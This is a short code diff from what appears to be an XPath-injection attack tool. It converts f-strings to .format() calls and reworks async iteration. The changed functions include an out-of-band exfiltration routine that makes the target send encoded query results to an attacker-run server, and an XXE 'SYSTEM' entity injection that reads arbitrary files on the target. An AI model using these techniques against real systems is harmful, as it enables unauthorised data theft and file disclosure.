@@ -96,7 +96,8 @@ async def get_string(requester: Requester, expression, disable_normalization=Fal
 
     if requester.fast and fetch_length != total_string_length:
         difference = total_string_length - fetch_length
-        return f'{result}... ({difference} more characters)'
+        return '{result}... ({difference} more characters)'.format(result=result,
+                                                                   difference=difference)
     else:
         if len(result) <= 10:
             requester.counters['common-strings'][result] += 1
@@ -122,7 +123,7 @@ async def get_string_via_oob(requester: Requester, expression):
     url, future = server.expect_data()
 
     if not await requester.check(
-                            doc(concat(f'{url}?d=',
+                            doc(concat('{url}?d='.format(url=url),
                                        encode_for_uri(expression))) / 'data' == server.test_response_value):
         return None
 
@@ -134,22 +135,21 @@ async def get_string_via_oob(requester: Requester, expression):
 
 async def get_file_via_entity_injection(requester: Requester, file_path):
     server = await requester.get_oob_server()
-    url, future = server.expect_entity_injection(f'SYSTEM "{file_path}"')
+    url, future = server.expect_entity_injection('SYSTEM "{file_path}"'.format(file_path=file_path))
 
     return await get_string_via_oob(requester, doc(url) / 'data')
 
 
-async def iterate_all(requester: Requester, expressions):
+def iterate_all(requester: Requester, expressions):
     for text in expressions:
-        yield await get_string(requester, text)
+        yield get_string(requester, text)
 
 
 async def get_all_text(requester: Requester, expression):
     text_node_count = await count(requester, expression.text)
-    text_contents = [
-        string
-        async for string in iterate_all(requester, expression.text(text_node_count))
-    ]
+    text_contents = await asyncio.gather(
+        *iterate_all(requester, expression.text(text_node_count))
+    )
 
     return "".join(text_contents)
 
